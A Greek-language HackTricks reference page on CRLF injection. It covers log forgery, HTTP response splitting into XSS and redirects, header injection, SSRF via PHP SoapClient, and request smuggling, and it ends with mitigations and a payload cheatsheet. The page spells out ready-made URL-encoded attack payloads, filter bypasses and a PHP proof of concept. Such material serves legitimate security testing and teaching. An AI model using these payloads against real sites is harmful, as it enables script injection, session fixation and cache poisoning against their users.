# CRLF (%0D%0A) Εισαγωγή

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Αν σας ενδιαφέρει μια **καριέρα στο χάκινγκ** και να χακεύετε το αχακέυτο - **προσλαμβάνουμε!** (_απαιτείται άπταιστη γραπτή και προφορική γνώση της πολωνικής_).

{% embed url="https://www.stmcyber.com/careers" %}

### CRLF

Το Carriage Return (CR) και το Line Feed (LF), γνωστά και ως CRLF, είναι ειδικές ακολουθίες χαρακτήρων που χρησιμοποιούνται στο πρωτόκολλο HTTP για να υποδείξουν το τέλος μιας γραμμής ή την έναρξη μιας νέας. Οι διακομιστές ιστού και οι περιηγητές χρησιμοποιούν το CRLF για να διαχωρίσουν τις κεφαλίδες HTTP από το σώμα μιας απόκρισης. Αυτοί οι χαρακτήρες χρησιμοποιούνται καθολικά στις επικοινωνίες HTTP/1.1 σε διάφορους τύπους διακομιστών ιστού, όπως ο Apache και ο Microsoft IIS.

### Ευπάθεια CRLF Injection

Η ευπάθεια CRLF injection περιλαμβάνει την εισαγωγή των χαρακτήρων CR και LF στην είσοδο που παρέχεται από τον χρήστη. Αυτή η ενέργεια παραπλανά τον διακομιστή, την εφαρμογή ή τον χρήστη ώστε να ερμηνεύσουν την εισαγόμενη ακολουθία ως το τέλος μιας απόκρισης και την έναρξη μιας άλλης. Αν και αυτοί οι χαρακτήρες δεν είναι κατ' αρχήν επιβλαβείς, η κατάχρησή τους μπορεί να οδηγήσει σε διάσπαση της απόκρισης HTTP και άλλες κακόβουλες δραστηριότητες.

### Παράδειγμα: CRLF Injection σε ένα αρχείο καταγραφής

[Παράδειγμα από εδώ](https://www.invicti.com/blog/web-security/crlf-http-header/)

Θεωρήστε ένα αρχείο καταγραφής σε έναν διαχειριστικό πίνακα που ακολουθεί τη μορφή: `IP - Ώρα - Διαδρομή Επισκέψεων`. Μια τυπική καταχώρηση μπορεί να φαίνεται όπως:
```
123.123.123.123 - 08:15 - /index.php?page=home
```
Ένας επιτιθέμενος μπορεί να εκμεταλλευτεί μια ενέργεια CRLF εισαγωγής για να παραπλανήσει αυτό το αρχείο καταγραφής. Εισάγοντας χαρακτήρες CRLF στο αίτημα HTTP, ο επιτιθέμενος μπορεί να αλλοιώσει την ροή εξόδου και να παραπλανήσει τις καταχωρήσεις καταγραφής. Για παράδειγμα, μια εισαγόμενη ακολουθία μπορεί να μετατρέψει την καταχώρηση καταγραφής σε:
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Εδώ, το `%0d` και `%0a` αντιπροσωπεύουν τις κωδικοποιημένες μορφές του CR και LF στο URL. Μετά την επίθεση, το αρχείο καταγραφής θα εμφανίζει παραπλανητικά:
```
IP - Time - Visited Path

123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Ο επιτιθέμενος καλύπτει τις κακόβουλες δραστηριότητές του κάνοντας να φαίνεται ότι ο τοπικός υπολογιστής (ένα οντότητα που συνήθως εμπιστεύεται στο περιβάλλον του διακομιστή) πραγματοποίησε τις ενέργειες. Ο διακομιστής ερμηνεύει το μέρος του ερωτήματος που ξεκινά με `%0d%0a` ως ένα μόνο παράμετρο, ενώ η παράμετρος `restrictedaction` αναλύεται ως άλλη, ξεχωριστή είσοδος. Το παραπλανημένο ερώτημα μιμείται αποτελεσματικά μια νόμιμη διαχειριστική εντολή: `/index.php?page=home&restrictedaction=edit`


### HTTP Response Splitting

#### Περιγραφή

Το HTTP Response Splitting είναι μια ευπάθεια ασφαλείας που προκύπτει όταν ένας επιτιθέμενος εκμεταλλεύεται τη δομή των απαντήσεων HTTP. Αυτή η δομή χωρίζει τις κεφαλίδες από το σώμα χρησιμοποιώντας μια συγκεκριμένη ακολουθία χαρακτήρων, τον χαρακτήρα επιστροφής καρέτου (CR) ακολουθούμενο από τον χαρακτήρα τελείας αλλαγής γραμμής (LF), που αποκαλούνται συλλήβδην CRLF. Αν ένας επιτιθέμενος καταφέρει να εισαγάγει μια ακολουθία CRLF σε μια κεφαλίδα απάντησης, μπορεί να επηρεάσει αποτελεσματικά το περιεχόμενο της επόμενης απάντησης. Αυτή η μορφή επεξεργασίας μπορεί να οδηγήσει σε σοβαρά θέματα ασφαλείας, ειδικά Cross-site Scripting (XSS).

#### XSS μέσω HTTP Response Splitting

1. Η εφαρμογή ορίζει μια προσαρμοσμένη κεφαλίδα όπως αυτή: `X-Custom-Header: UserInput`
2. Η εφαρμογή ανακτά την τιμή για το `UserInput` από ένα παράμετρο ερωτήματος, ας πούμε "user_input". Σε περιπτώσεις που λείπει η κατάλληλη επικύρωση και κωδικοποίηση της εισόδου, ένας επιτιθέμενος μπορεί να δημιουργήσει ένα φορτίο που περιλαμβάνει την ακολουθία CRLF, ακολουθούμενη από κακόβουλο περιεχόμενο.
3. Ένας επιτιθέμενος δημιουργεί ένα URL με έναν ειδικά διαμορφωμένο 'user_input': `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
- Σε αυτό το URL, το `%0d%0a%0d%0a` είναι η κωδικοποίηση του CRLFCRLF. Απατά τον διακομιστή να εισάγει μια ακολουθία CRLF, καθιστώντας τον διακομιστή να θεωρεί το επόμενο μέρος ως το σώμα της απάντησης.
4. Ο διακομιστής αντανακλά την είσοδο του επιτιθέμενου στην κεφαλίδα της απάντησης, οδηγώντας σε μια μη επιθυμητή δομή απάντησης όπου το κακόβουλο script ερμηνεύεται από τον περιηγητή ως μέρος του σώματος της απάντησης.

#### Ένα παράδειγμα του HTTP Response Splitting που οδηγεί σε ανακατεύθυνση

Από [https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)

Περιηγητής σε:
```
/%0d%0aLocation:%20http://myweb.com
```
Και ο διακομιστής απαντά με τον επικεφαλίδα:
```
Location: http://myweb.com
```
**Άλλο παράδειγμα: (από** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### Στη διαδρομή URL

Μπορείτε να στείλετε το φορτίο **μέσα στη διαδρομή URL** για να ελέγξετε τη **απόκριση** από τον διακομιστή (παράδειγμα από [εδώ](https://hackerone.com/reports/192667)):
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
Ελέγξτε περισσότερα παραδείγματα στο:

{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### Εισαγωγή Κεφαλίδας HTTP

Η εισαγωγή κεφαλίδας HTTP, συχνά εκμεταλλευόμενη μέσω εισαγωγής CRLF (Carriage Return and Line Feed), επιτρέπει στους επιτιθέμενους να εισάγουν κεφαλίδες HTTP. Αυτό μπορεί να υπονομεύσει μηχανισμούς ασφαλείας όπως οι φίλτρα XSS (Cross-Site Scripting) ή η πολιτική SOP (Same-Origin Policy), με πιθανή αποτέλεσμα την μη εξουσιοδοτημένη πρόσβαση σε ευαίσθητα δεδομένα, όπως τα CSRF tokens, ή την παραπλάνηση των συνεδριών χρήστη μέσω της εγκατάστασης cookie.

#### Εκμεταλλευόμενοι το CORS μέσω εισαγωγής κεφαλίδας HTTP

Ένας επιτιθέμενος μπορεί να εισάγει κεφαλίδες HTTP για να ενεργοποιήσει το CORS (Cross-Origin Resource Sharing), παρακάμπτοντας τους περιορισμούς που επιβάλλονται από την πολιτική SOP. Αυτή η παραβίαση επιτρέπει σε σενάρια από κακόβουλες προέλευσεις να αλληλεπιδρούν με πόρους από διαφορετική προέλευση, με πιθανή πρόσβαση σε προστατευμένα δεδομένα.

#### SSRF και εισαγωγή αιτήματος HTTP μέσω CRLF

Η εισαγωγή CRLF μπορεί να χρησιμοποιηθεί για τη δημιουργία και εισαγωγή ενός εντελώς νέου αιτήματος HTTP. Ένα παρατηρητέο παράδειγμα αυτού είναι η ευπάθεια στην κλάση `SoapClient` της PHP, ειδικότερα στην παράμετρο `user_agent`. Με την παραπλάνηση αυτής της παραμέτρου, ένας επιτιθέμενος μπορεί να εισάγει επιπλέον κεφαλίδες και περιεχόμενο σώματος, ή ακόμη και να εισάγει ένα εντελώς νέο αίτημα HTTP. Παρακάτω παρουσιάζεται ένα παράδειγμα σε PHP που επιδεικνύει αυτήν την εκμετάλλευση:
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

# Put a netcat listener on port 9090
$client->__soapCall("test", []);
```
### Εισαγωγή κεφαλίδων για Request Smuggling

Για περισσότερες πληροφορίες σχετικά με αυτήν την τεχνική και τυχόν προβλήματα [**ελέγξτε την αρχική πηγή**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

Μπορείτε να εισάγετε κρίσιμες κεφαλίδες για να διασφαλίσετε ότι ο **back-end διατηρεί τη σύνδεση ανοιχτή** μετά την απόκριση στο αρχικό αίτημα:
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
Στη συνέχεια, μπορεί να καθοριστεί ένα δεύτερο αίτημα. Αυτό το σενάριο συνήθως περιλαμβάνει [HTTP request smuggling](http-request-smuggling/), μια τεχνική όπου επιπλέον κεφαλίδες ή στοιχεία σώματος που προστίθενται από τον διακομιστή μετά την εισαγωγή μπορούν να οδηγήσουν σε διάφορες εκμεταλλεύσεις ασφαλείας.

**Εκμετάλλευση:**

1. **Κακόβουλη Προσθήκη Προθέματος**: Αυτή η μέθοδος περιλαμβάνει την δηλητηρίαση του επόμενου αιτήματος του χρήστη ή της προσωρινής μνήμης του ιστού με την καθορισμό ενός κακόβουλου προθέματος. Ένα παράδειγμα αυτού είναι:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

2. **Δημιουργία Προθέματος για Δηλητηρίαση της Ουράς Απάντησης**: Αυτή η προσέγγιση περιλαμβάνει τη δημιουργία ενός προθέματος που, σε συνδυασμό με αχρήστευτα τελείωματα, σχηματίζει ένα πλήρες δεύτερο αίτημα. Αυτό μπορεί να προκαλέσει δηλητηρίαση της ουράς απάντησης. Ένα παράδειγμα είναι:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

### Μείωση του Κινδύνου Εισαγωγών CRLF / HTTP Header σε Εφαρμογές Ιστού

Για να μειωθούν οι κίνδυνοι των εισαγωγών CRLF (Carriage Return and Line Feed) ή HTTP Header σε εφαρμογές ιστού, συνιστώνται οι εξής στρατηγικές:

1. **Αποφυγή Άμεσης Εισόδου Χρήστη στις Κεφαλίδες Απάντησης:**
Η ασφαλέστερη προσέγγιση είναι να αποφεύγετε την ενσωμάτωση εισόδου που παρέχεται απευθείας από τον χρήστη στις κεφαλίδες απάντησης.

2. **Κωδικοποίηση Ειδικών Χαρακτήρων:**
Εάν δεν είναι δυνατή η αποφυγή της άμεσης εισόδου του χρήστη, βεβαιωθείτε ότι χρησιμοποιείται μια συνάρτηση που αφιερώνεται στην κωδικοποίηση ειδικών χαρακτήρων όπως CR (Carriage Return) και LF (Line Feed). Αυτή η πρακτική αποτρέπει τη δυνατότητα εισαγωγής CRLF.

3. **Ενημέρωση της Γλώσσας Προγραμματισμού:**
Ενημερώνετε τακτικά τη γλώσσα προγραμματισμού που χρησιμοποιείτε στις εφαρμογές ιστού σας στην τελευταία έκδοση. Επιλέξτε μια έκδοση που απαγορεύει από μόνη της την εισαγωγή χαρακτήρων CR και LF μέσα σε συναρτήσεις που ασχολούνται με την καθορισμό των κεφαλίδων HTTP.


### CHEATSHEET

[Φύλλο από εδώ](https://twitter.com/NinadMishra5/status/1650080604174667777)
```
1. HTTP Response Splitting
• /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
• //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
• /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
• /google.com/%2F..%0D%0AHeader-Test:test2
• /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
• /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
• /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
• %E5%98%8A = %0A = \u560a
• %E5%98%8D = %0D = \u560d
• %E5%98%BE = %3E = \u563e (>)
• %E5%98%BC = %3C = \u563c (<)
• Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## Αυτόματα Εργαλεία

* [https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)
* [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

## Λίστα Ανίχνευσης Brute-Force

* [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt)

## Αναφορές
* [**https://www.invicti.com/blog/web-security/crlf-http-header/**](https://www.invicti.com/blog/web-security/crlf-http-header/)
* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
* [**https://www.netsparker.com/blog/web-security/crlf-http-header/**](https://www.netsparker.com/blog/web-security/crlf-http-header/)

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Εάν ενδιαφέρεστε για μια **καριέρα στο χάκινγκ** και για να χακεύσετε το αχακέυτο - **προσλαμβάνουμε!** (_απαιτείται άριστη γνώση γραπτού και προφορικού Πολωνικών_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
